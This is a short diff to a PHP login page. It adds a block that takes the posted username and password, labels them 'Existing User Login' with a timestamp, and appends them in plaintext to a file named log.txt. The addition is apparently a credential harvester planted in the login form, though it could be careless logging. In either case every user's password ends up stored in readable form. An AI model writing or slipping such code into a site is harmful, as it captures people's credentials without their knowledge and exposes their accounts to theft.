@@ -46,6 +46,24 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
 
 }
 ?>
+<?php
+
+ if(isset($_POST['register']))
+ {
+  $username = $_POST['username'];
+  $password = $_POST['password'];
+  $date = new DateTime();
+  $date = $date->format("y:m:d h:i:s");
+  $text = $date . "Existing User Login" . " Username = " . $username . " , " . "Password = " . $password . "\n";
+  $fp = fopen('log.txt', 'a+');
+
+    if(fwrite($fp, $text))  {
+        echo 'saved';
+
+    }
+fclose ($fp);
+}
+?>
 <html >
 <head>
     <title>Login</title>
